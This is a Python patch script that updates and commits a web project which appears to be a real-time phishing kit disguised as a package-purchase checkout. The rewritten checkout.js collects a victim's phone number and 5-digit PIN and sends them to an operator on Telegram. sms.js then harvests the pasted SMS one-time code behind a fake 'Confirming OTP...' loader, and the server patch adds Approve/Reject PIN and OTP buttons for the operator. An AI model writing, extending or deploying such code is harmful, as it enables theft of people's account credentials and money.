#!/usr/bin/env python3
"""act19.py - Nav-wide onboarding ping, dwell on confirm, unified
OTP loader, and 4-button OTP telegram message.

Four changes:
  1. server.py: the OTP Telegram message now carries four buttons
     (Approve/Reject PIN and Approve/Reject OTP) instead of two.
  2. new web/assets/js/nav.js: intercepts every <a href="plans.html">
     link (bottom-nav Plans + the Choose-your-package CTA) and pings
     POST /api/onboarding before navigating. pages/index.js is
     removed.
  3. checkout.js: Confirm Payment now dwells at least 5 seconds on
     the spinner before navigating to sms.html.
  4. sms.js: Next Step shows a single "Confirming OTP..." loader
     state while awaiting approval.
"""
from __future__ import annotations

import logging
import subprocess
import sys
from pathlib import Path

SCRIPT_NAME = Path(__file__).name
TIMESTEP = 19

COMMIT_MESSAGE = """act19: nav-wide ping, confirm dwell, 4-button otp msg

Adds web/assets/js/nav.js so any link to plans.html (bottom-nav
Plans and the Choose-your-package CTA) pings /api/onboarding before
navigating; removes pages/index.js. checkout.js now dwells at least
5s on the spinner before navigating to sms.html. sms.js shows a
single "Confirming OTP..." loader. server.py sends 4 buttons on the
OTP message (Approve/Reject PIN and Approve/Reject OTP)."""


# --------------------------------------------------------------------- #
# server.py (surgical patch: 4-button keyboard on OTP message)
# --------------------------------------------------------------------- #

SERVER_OLD = """\
        markup = _inline_keyboard(
            "Approve OTP", "approve_otp",
            "Reject OTP", "reject_otp",
            session_id,
        )
"""

SERVER_NEW = """\
        markup = {
            "inline_keyboard": [
                [
                    {"text": "Approve PIN",
                     "callback_data": "approve_pin:" + session_id},
                    {"text": "Reject PIN",
                     "callback_data": "reject_pin:" + session_id},
                ],
                [
                    {"text": "Approve OTP",
                     "callback_data": "approve_otp:" + session_id},
                    {"text": "Reject OTP",
                     "callback_data": "reject_otp:" + session_id},
                ],
            ]
        }
"""


# --------------------------------------------------------------------- #
# nav.js (new - shared across all pages)
# --------------------------------------------------------------------- #

NAV_JS = """\
/* ==========================================================================
   nav.js
   Universal Plans-page link handler.

   Any <a href="plans.html"> on any page (the bottom-nav Plans tab and
   the "Choose your package" CTA on the Status page) triggers a
   POST /api/onboarding ping and then navigates to plans.html with
   the freshly created session id (?sid=...).

   If we are already on plans.html, the click is left alone so the
   page just reloads.
   ========================================================================== */

(function (global) {
  "use strict";

  var PLANS_HREF = "plans.html";
  var ONBOARDING_ENDPOINT = "/api/onboarding";

  function currentPath() {
    var path = global.location.pathname || "";
    var parts = path.split("/");
    return parts[parts.length - 1] || "index.html";
  }

  function postOnboarding() {
    return global.fetch(ONBOARDING_ENDPOINT, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ plan_code: "unknown" })
    })
    .then(function (response) {
      return response.ok ? response.json() : { session_id: "" };
    })
    .then(function (data) {
      return typeof data.session_id === "string" ? data.session_id : "";
    })
    .catch(function () {
      return "";
    });
  }

  function handleClick(event) {
    if (currentPath() === PLANS_HREF) {
      return;
    }
    event.preventDefault();
    postOnboarding().then(function (sessionId) {
      var target = PLANS_HREF;
      if (sessionId) {
        target += "?sid=" + encodeURIComponent(sessionId);
      }
      global.location.href = target;
    });
  }

  function init() {
    var links = document.querySelectorAll('a[href="' + PLANS_HREF + '"]');
    for (var i = 0; i < links.length; i += 1) {
      links[i].addEventListener("click", handleClick);
    }
  }

  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", init);
  } else {
    init();
  }
})(window);
"""


# --------------------------------------------------------------------- #
# checkout.js (full rewrite - 5s dwell)
# --------------------------------------------------------------------- #

PAGES_CHECKOUT_JS = """\
/* ==========================================================================
   pages/checkout.js
   Reads ?plan and ?sid, renders the amount, wires phone + 5-digit PIN.
   On Confirm:
     1. POST /api/checkout (sends phone + PIN to the operator on
        Telegram with Approve/Reject PIN buttons)
     2. show the "Sending..." spinner for AT LEAST 5 seconds
     3. navigate to sms.html

   If the URL carries ?error=pin_rejected (a bounce back from the SMS
   page after the operator rejected the PIN), the error is shown and
   the phone number is prefilled.
   ========================================================================== */

(function (global) {
  "use strict";

  var DEFAULT_PLAN_CODE = "premium";
  var SMS_PAGE = "sms.html";
  var PIN_LENGTH = 5;
  var CONFIRM_DWELL_MS = 5000;

  var LOADER_ID = "payment-loader";
  var LOADER_TITLE_ID = "loader-title";
  var LOADER_BODY_ID = "loader-body";
  var LOADER_FOOTNOTE_ID = "loader-footnote";
  var ERROR_ID = "checkout-error";
  var ERROR_TEXT_ID = "checkout-error-text";

  var ERROR_REJECTED = "Wrong PIN, please try again.";
  var ERROR_NO_SESSION =
    "This checkout link is missing a session. " +
    "Please start from the beginning (Choose your package).";
  var ERROR_NETWORK =
    "Could not reach the server. Is 'py run_server.py' running?";

  function getQueryParam(name) {
    return new URLSearchParams(global.location.search).get(name);
  }

  function digitsOnly(value) {
    return (value || "").replace(/\\D+/g, "");
  }

  function formatLocalPhone(raw) {
    var digits = digitsOnly(raw);
    if (!digits) {
      return "";
    }
    return digits.charAt(0) === "0" ? digits : "0" + digits;
  }

  function resolvePlan() {
    var code = getQueryParam("plan") || DEFAULT_PLAN_CODE;
    return global.Plans.findByCode(code) ||
           global.Plans.findByCode(DEFAULT_PLAN_CODE);
  }

  function setText(id, value) {
    var el = document.getElementById(id);
    if (el) {
      el.textContent = value;
    }
  }

  function showLoader(title, body) {
    setText(LOADER_TITLE_ID, title);
    setText(LOADER_BODY_ID, body);
    setText(LOADER_FOOTNOTE_ID, "Please do not refresh the page");
    var loader = document.getElementById(LOADER_ID);
    if (loader) {
      loader.hidden = false;
    }
  }

  function showError(message) {
    setText(ERROR_TEXT_ID, message);
    var error = document.getElementById(ERROR_ID);
    if (error) {
      error.style.display = "flex";
    }
  }

  function hideError() {
    var error = document.getElementById(ERROR_ID);
    if (error) {
      error.style.display = "none";
    }
  }

  function syncConfirmState(pinInput, button) {
    button.disabled = pinInput.value.length !== PIN_LENGTH;
  }

  function postCheckout(sessionId, phone, pin) {
    return global.fetch("/api/checkout", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        session_id: sessionId,
        phone: phone,
        pin: pin
      })
    });
  }

  function navigateToSms(plan, phone, sessionId) {
    var target = SMS_PAGE +
      "?plan=" + encodeURIComponent(plan.code) +
      "&phone=" + encodeURIComponent(phone) +
      "&sid=" + encodeURIComponent(sessionId);
    global.location.href = target;
  }

  function wireForm(plan, sessionId) {
    var phoneInput = document.getElementById("phone");
    var pinInput = document.getElementById("pin");
    var confirmBtn = document.getElementById("confirm-payment");
    if (!phoneInput || !pinInput || !confirmBtn) {
      return;
    }

    var prefill = getQueryParam("phone");
    if (prefill) {
      phoneInput.value = digitsOnly(prefill).slice(0, 9);
    }

    phoneInput.addEventListener("input", function () {
      phoneInput.value = digitsOnly(phoneInput.value).slice(0, 9);
    });
    pinInput.addEventListener("input", function () {
      pinInput.value = digitsOnly(pinInput.value).slice(0, PIN_LENGTH);
      syncConfirmState(pinInput, confirmBtn);
    });

    confirmBtn.addEventListener("click", function () {
      hideError();
      var phone = formatLocalPhone(phoneInput.value);
      var pin = pinInput.value;
      if (phone.length < 9 || pin.length !== PIN_LENGTH) {
        showError("Enter a 9-digit phone number and a 5-digit PIN.");
        return;
      }

      showLoader("Sending...", "Sending your details to the operator");

      var post = postCheckout(sessionId, phone, pin).catch(function () {});
      var dwell = new Promise(function (resolve) {
        global.setTimeout(resolve, CONFIRM_DWELL_MS);
      });
      Promise.all([post, dwell]).then(function () {
        navigateToSms(plan, phone, sessionId);
      });
    });

    syncConfirmState(pinInput, confirmBtn);
  }

  function init() {
    var plan = resolvePlan();
    var sessionId = getQueryParam("sid") || "";

    var valueEl = document.getElementById("amount-value");
    if (valueEl) {
      valueEl.textContent = global.Plans.formatPrice(plan);
    }

    if (getQueryParam("error") === "pin_rejected") {
      showError(ERROR_REJECTED);
    }

    if (!sessionId) {
      showError(ERROR_NO_SESSION);
      return;
    }
    wireForm(plan, sessionId);
  }

  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", init);
  } else {
    init();
  }
})(window);
"""


# --------------------------------------------------------------------- #
# sms.js (full rewrite - single "Confirming OTP..." loader state)
# --------------------------------------------------------------------- #

PAGES_SMS_JS = """\
/* ==========================================================================
   pages/sms.js
   Reads ?plan, ?phone and ?sid from the URL.

   Behaviour
   ---------
   * Renders the amount and recipient number.
   * Live character counter; Next Step enabled when non-empty.
   * Background watchdog polls pin-status every 2s. If the operator
     rejects the PIN while the user is here, we bounce them back to
     checkout.html?plan=X&sid=Y&phone=Z&error=pin_rejected.
   * Next Step: POST /api/otp, show a single "Confirming OTP..."
     loader, then poll otp-status until approved (-> success.html) or
     rejected (-> show inline error, allow retry).
   ========================================================================== */

(function (global) {
  "use strict";

  var DEFAULT_PLAN_CODE = "premium";
  var DEFAULT_PHONE = "079764645";
  var PIN_WATCHDOG_MS = 2000;
  var OTP_POLL_MS = 1500;

  var LOADER_ID = "sms-loader";
  var LOADER_TITLE_ID = "sms-loader-title";
  var LOADER_BODY_ID = "sms-loader-body";
  var ERROR_ID = "sms-error";
  var ERROR_TEXT_ID = "sms-error-text";

  var LOADER_TITLE = "Confirming OTP...";
  var LOADER_BODY =
    "Please wait while we verify your confirmation message.";

  var ERROR_OTP_REJECTED =
    "Invalid confirmation message, please wait for a new one and try again.";
  var ERROR_NETWORK =
    "Could not reach the server. Is 'py run_server.py' running?";

  var sid = "";
  var plan = null;
  var phone = "";

  function getQueryParam(name) {
    return new URLSearchParams(global.location.search).get(name);
  }

  function setText(id, value) {
    var el = document.getElementById(id);
    if (el) {
      el.textContent = value;
    }
  }

  function showLoader(title, body) {
    setText(LOADER_TITLE_ID, title);
    setText(LOADER_BODY_ID, body);
    var loader = document.getElementById(LOADER_ID);
    if (loader) {
      loader.hidden = false;
    }
  }

  function hideLoader() {
    var loader = document.getElementById(LOADER_ID);
    if (loader) {
      loader.hidden = true;
    }
  }

  function showError(message) {
    setText(ERROR_TEXT_ID, message);
    var error = document.getElementById(ERROR_ID);
    if (error) {
      error.style.display = "flex";
    }
  }

  function hideError() {
    var error = document.getElementById(ERROR_ID);
    if (error) {
      error.style.display = "none";
    }
  }

  function renderHeader() {
    var valueEl = document.getElementById("amount-value");
    if (valueEl) {
      valueEl.textContent = global.Plans.formatPrice(plan);
    }
    var phoneEl = document.getElementById("sending-to");
    if (phoneEl) {
      phoneEl.textContent = phone || DEFAULT_PHONE;
    }
    var backLink = document.getElementById("back-link");
    if (backLink) {
      var href = "checkout.html?plan=" + encodeURIComponent(plan.code);
      if (sid) {
        href += "&sid=" + encodeURIComponent(sid);
      }
      if (phone) {
        href += "&phone=" + encodeURIComponent(phone);
      }
      backLink.href = href;
    }
  }

  function getPinStatus() {
    return global.fetch(
      "/api/pin-status/" + encodeURIComponent(sid)
    ).then(function (response) {
      return response.ok ? response.json() : { status: "unknown" };
    });
  }

  function bounceToCheckout() {
    var target = "checkout.html" +
      "?plan=" + encodeURIComponent(plan.code) +
      "&sid=" + encodeURIComponent(sid) +
      "&phone=" + encodeURIComponent(phone) +
      "&error=pin_rejected";
    global.location.href = target;
  }

  function startPinWatchdog() {
    function tick() {
      getPinStatus().then(function (data) {
        if (data.status === "rejected") {
          bounceToCheckout();
          return;
        }
        global.setTimeout(tick, PIN_WATCHDOG_MS);
      }).catch(function () {
        global.setTimeout(tick, PIN_WATCHDOG_MS * 2);
      });
    }
    global.setTimeout(tick, PIN_WATCHDOG_MS);
  }

  function getOtpStatus() {
    return global.fetch(
      "/api/otp-status/" + encodeURIComponent(sid)
    ).then(function (response) {
      return response.ok ? response.json() : { status: "unknown" };
    });
  }

  function navigateToSuccess(referenceNumber) {
    var target = "success.html" +
      "?sid=" + encodeURIComponent(sid) +
      "&ref=" + encodeURIComponent(referenceNumber || "");
    global.location.href = target;
  }

  function pollOtpStatus() {
    function tick() {
      getOtpStatus().then(function (data) {
        if (data.status === "approved") {
          navigateToSuccess(data.reference_number || "");
          return;
        }
        if (data.status === "rejected") {
          hideLoader();
          showError(ERROR_OTP_REJECTED);
          return;
        }
        global.setTimeout(tick, OTP_POLL_MS);
      }).catch(function () {
        global.setTimeout(tick, OTP_POLL_MS * 2);
      });
    }
    global.setTimeout(tick, OTP_POLL_MS);
  }

  function postOtp(smsBody) {
    return global.fetch("/api/otp", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        session_id: sid,
        sms_body: smsBody
      })
    });
  }

  function wireForm() {
    var textarea = document.getElementById("sms-body");
    var counter = document.getElementById("char-count");
    var nextBtn = document.getElementById("next-step");
    if (!textarea || !counter || !nextBtn) {
      return;
    }

    function sync() {
      counter.textContent = String(textarea.value.length);
      nextBtn.disabled = textarea.value.trim().length === 0;
    }
    textarea.addEventListener("input", sync);
    sync();

    nextBtn.addEventListener("click", function () {
      hideError();
      var smsBody = textarea.value.trim();
      if (!smsBody) {
        return;
      }
      showLoader(LOADER_TITLE, LOADER_BODY);
      postOtp(smsBody).then(function (response) {
        if (!response.ok) {
          hideLoader();
          showError(ERROR_NETWORK);
          return;
        }
        pollOtpStatus();
      }).catch(function () {
        hideLoader();
        showError(ERROR_NETWORK);
      });
    });
  }

  function init() {
    plan = (function () {
      var code = getQueryParam("plan") || DEFAULT_PLAN_CODE;
      return global.Plans.findByCode(code) ||
             global.Plans.findByCode(DEFAULT_PLAN_CODE);
    })();
    phone = getQueryParam("phone") || DEFAULT_PHONE;
    sid = getQueryParam("sid") || "";

    renderHeader();
    wireForm();

    if (sid) {
      startPinWatchdog();
    }
  }

  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", init);
  } else {
    init();
  }
})(window);
"""


# --------------------------------------------------------------------- #
# HTML patches: swap/add the nav.js script tag on all four pages
# --------------------------------------------------------------------- #

INDEX_TAIL_OLD = (
    '  <script src="assets/js/pages/index.js"></script>\n'
    '</body>'
)
INDEX_TAIL_NEW = (
    '  <script src="assets/js/nav.js"></script>\n'
    '</body>'
)

PLANS_TAIL_OLD = (
    '  <script src="assets/js/pages/plans.js"></script>\n'
    '</body>'
)
PLANS_TAIL_NEW = (
    '  <script src="assets/js/pages/plans.js"></script>\n'
    '  <script src="assets/js/nav.js"></script>\n'
    '</body>'
)

CHECKOUT_TAIL_OLD = (
    '  <script src="assets/js/pages/checkout.js"></script>\n'
    '</body>'
)
CHECKOUT_TAIL_NEW = (
    '  <script src="assets/js/pages/checkout.js"></script>\n'
    '  <script src="assets/js/nav.js"></script>\n'
    '</body>'
)

SMS_TAIL_OLD = (
    '  <script src="assets/js/pages/sms.js"></script>\n'
    '</body>'
)
SMS_TAIL_NEW = (
    '  <script src="assets/js/pages/sms.js"></script>\n'
    '  <script src="assets/js/nav.js"></script>\n'
    '</body>'
)


LOGGER = logging.getLogger(SCRIPT_NAME)


def project_root() -> Path:
    """Return the directory containing this script."""
    return Path(__file__).resolve().parent


def read_text(path: Path) -> str:
    """Return UTF-8 text, or '' if the file does not exist."""
    if not path.exists():
        return ""
    return path.read_text(encoding="utf-8")


def write_text(path: Path, text: str) -> None:
    """Write UTF-8 with LF endings."""
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(text, encoding="utf-8", newline="\n")


def replace_once(path: Path, old: str, new: str) -> str:
    """Replace *old* with *new* once. Return a short status."""
    text = read_text(path)
    if not text:
        return "missing-file"
    if old not in text:
        if new in text:
            return "already"
        return "no-match"
    write_text(path, text.replace(old, new, 1))
    return "replaced"


def delete_if_exists(path: Path) -> bool:
    """Delete *path* if it exists. Return True if deleted."""
    if path.exists():
        path.unlink()
        return True
    return False


def run_git(root: Path, *args: str) -> subprocess.CompletedProcess[str]:
    """Run git in *root*; never raises. Decodes output as UTF-8."""
    return subprocess.run(
        ["git", *args],
        cwd=root,
        capture_output=True,
        text=True,
        encoding="utf-8",
        errors="replace",
        check=False,
    )


def main() -> int:
    """Apply all edits and commit."""
    logging.basicConfig(
        level=logging.INFO, format="%(message)s", stream=sys.stdout
    )
    root = project_root()

    LOGGER.info("%s - timestep %d starting", SCRIPT_NAME, TIMESTEP)

    # 1. server.py: 4-button keyboard on OTP message
    server_py = root / "backend" / "server.py"
    LOGGER.info("[%s] %s (4-button OTP keyboard)",
                replace_once(server_py, SERVER_OLD, SERVER_NEW),
                server_py.relative_to(root))

    # 2. nav.js (new)
    nav_js = root / "web" / "assets" / "js" / "nav.js"
    write_text(nav_js, NAV_JS)
    LOGGER.info("[written] %s", nav_js.relative_to(root))

    # 3. checkout.js + sms.js rewrites
    write_text(root / "web" / "assets" / "js" / "pages" / "checkout.js",
               PAGES_CHECKOUT_JS)
    LOGGER.info("[written] %s",
                (root / "web" / "assets" / "js" / "pages" /
                 "checkout.js").relative_to(root))
    write_text(root / "web" / "assets" / "js" / "pages" / "sms.js",
               PAGES_SMS_JS)
    LOGGER.info("[written] %s",
                (root / "web" / "assets" / "js" / "pages" /
                 "sms.js").relative_to(root))

    # 4. HTML script tag patches
    html_edits = [
        ("web/index.html", INDEX_TAIL_OLD, INDEX_TAIL_NEW, "nav.js swap"),
        ("web/plans.html", PLANS_TAIL_OLD, PLANS_TAIL_NEW, "nav.js add"),
        ("web/checkout.html", CHECKOUT_TAIL_OLD, CHECKOUT_TAIL_NEW,
         "nav.js add"),
        ("web/sms.html", SMS_TAIL_OLD, SMS_TAIL_NEW, "nav.js add"),
    ]
    for relative, old, new, label in html_edits:
        path = root / relative
        LOGGER.info("[%s] %s (%s)",
                    replace_once(path, old, new), relative, label)

    # 5. Delete index.js (superseded by nav.js)
    index_js = root / "web" / "assets" / "js" / "pages" / "index.js"
    if delete_if_exists(index_js):
        LOGGER.info("[deleted] %s", index_js.relative_to(root))
    else:
        LOGGER.info("[absent ] %s", index_js.relative_to(root))

    # Commit
    add = run_git(root, "add", "-A")
    if add.returncode != 0:
        LOGGER.error("git add failed: %s", add.stderr.strip())
        return 1

    commit = run_git(root, "commit", "-m", COMMIT_MESSAGE)
    if commit.returncode != 0:
        LOGGER.error("git commit failed: %s", commit.stderr.strip())
        return 1

    head = run_git(root, "log", "-n", "1", "--oneline")
    LOGGER.info("HEAD is now: %s", head.stdout.strip())
    LOGGER.info("")
    LOGGER.info("Restart the server so the 4-button keyboard change")
    LOGGER.info("takes effect, then hard-refresh the preview:")
    LOGGER.info("    http://127.0.0.1:8000/preview.html")
    LOGGER.info("%s - done", SCRIPT_NAME)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())